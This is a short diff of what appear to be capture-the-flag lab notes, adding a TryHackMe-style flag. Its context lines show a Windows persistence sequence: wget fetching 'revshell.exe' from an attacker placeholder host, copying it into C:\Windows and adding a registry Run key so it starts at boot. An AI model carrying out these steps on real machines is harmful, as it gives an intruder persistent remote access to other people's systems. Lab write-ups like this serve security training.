@@ -216,3 +216,4 @@ wget http://AttackIP:8000/revshell.exe -O revshell.exe
 move revshell.exe C:\Windows
 go to HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 -add REG_EXPAND_SZ with value C:\Windows\revshell.exe
+*THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
